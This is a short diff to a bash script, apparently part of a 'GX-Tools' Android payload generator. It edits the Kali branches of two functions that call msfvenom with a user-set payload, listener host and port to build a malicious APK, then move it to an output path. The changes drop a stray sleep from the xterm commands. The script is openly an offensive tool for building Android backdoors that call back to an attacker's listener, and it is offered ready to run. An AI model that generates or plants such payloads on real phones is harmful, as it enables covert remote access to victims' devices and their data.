@@ -293,10 +293,11 @@ create_internal_payload() {
         sleep 1s
         echo ''
         sleep 1s
-    elif [[ "$SYSTEM" == "kali" ]]; then 
-        xterm -T " GENERATE APK PAYLOAD" -e sleep 2s msfvenom -p $PAYLOAD LHOST=$lhost1 LPORT=$lport1 -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name.apk > /dev/null 2>&1
+    elif [[ "$SYSTEM" == "kali" ]]; then
+        sleep 1s
+        xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$lhost1 LPORT=$lport1 -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name.apk > /dev/null 2>&1
         sleep 2s
-        xterm -T " Moving APK TO PATH " -e sleep 2s mv $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name.apk $pay_path > /dev/null 2>&1
+        xterm -T " Moving APK TO PATH " -e mv $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name.apk $pay_path > /dev/null 2>&1
         sleep 1s
         echo ''
         sleep 1s
@@ -342,9 +343,9 @@ create_external_payload() {
         echo ''
         sleep 1s
     elif [[ "$SYSTEM" == "kali" ]]; then 
-        xterm -T " GENERATE APK PAYLOAD" -e sleep 2s msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$lport -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name1.apk > /dev/null 2>&1
+        xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$lhost LPORT=$lport -a dalvik --platform android R -o $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name1.apk > /dev/null 2>&1
         sleep 2s
-        xterm -T " Moving APK TO PATH " -e sleep 2s mv $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name1.apk $pay_path1 > /dev/null 2>&1 
+        xterm -T " Moving APK TO PATH " -e mv $HOME/.GX-Tools/Android-Payload-Generator/Payloads/$payload_name1.apk $pay_path1 > /dev/null 2>&1 
         sleep 1s
         echo ''
         sleep 1s
